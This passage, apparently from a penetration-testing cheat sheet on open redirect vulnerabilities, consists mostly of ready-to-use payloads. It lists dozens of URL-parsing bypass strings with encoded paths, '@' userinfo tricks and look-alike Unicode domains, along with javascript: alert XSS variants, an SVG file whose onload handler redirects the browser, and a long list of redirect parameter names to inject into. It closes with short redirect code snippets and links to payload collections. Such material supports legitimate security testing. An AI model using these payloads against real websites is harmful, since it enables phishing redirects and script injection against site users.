http:XY>.7d8T\205pZM@3627734734
http://XY>.7d8T\205pZM@472.314.470.462
http:XY>.7d8T\205pZM@472.314.470.462
http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http://XY>.7d8T\205pZM@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://XY>.7d8T\205pZM@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://XY>.7d8T\205pZM@whitelisted.com@google.com/
http://XY>.7d8T\205pZM@whitelisted.com+@google.com/
ja\nva\tscript\r:alert(1)
java%09script:alert(1)
java%0ascript:alert(1)
java%0d%0ascript%0d%0a:alert(0)
java%0dscript:alert(1)
Javas%26%2399;ript:alert(1)
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twhitelisted.com/
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@whitelisted.com
//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
whitelisted.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/\whitelisted.com:80%40google.com
whitelisted.com@%E2%80%AE@google.com
////whitelisted.com@google.com//
////whitelisted.com@google.com/
///whitelisted.com@google.com//
///whitelisted.com@google.com/
//whitelisted.com@google.com//
//whitelisted.com@google.com/
whitelisted.com;@google.com
whitelisted.com.google.com
////whitelisted.com@google.com/%2e%2e
///whitelisted.com@google.com/%2e%2e
////whitelisted.com@google.com/%2e%2e%2f
///whitelisted.com@google.com/%2e%2e%2f
//whitelisted.com@google.com/%2e%2e%2f
////whitelisted.com@google.com/%2f..
///whitelisted.com@google.com/%2f..
//whitelisted.com@google.com/%2f..
////whitelisted.com@google.com/%2f%2e%2e
///whitelisted.com@google.com/%2f%2e%2e
//whitelisted.com@google.com/%2f%2e%2e
//whitelisted.com+&@google.com#+@whitelisted.com/
//whitelisted.com@https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
//whitelisted.com@https:///google.com/%2e%2e
//whitelisted.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@whitelisted.com/
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
//XY>.7d8T\205pZM@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//XY>.7d8T\205pZM@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//XY>.7d8T\205pZM@whitelisted.com@google.com/
//XY>.7d8T\205pZM@whitelisted.com+@google.com/
```

## Open Redirect uploading svg files

```markup
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```

## Common injection parameters

```text
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```

## Code examples

#### .Net

```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```

#### Java

```bash
response.redirect("http://mysafedomain.com");
```

#### PHP

```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```

## Tools

* [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)

## Resources

In [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect) you can find fuzzing lists.  
[https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)  
[https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)

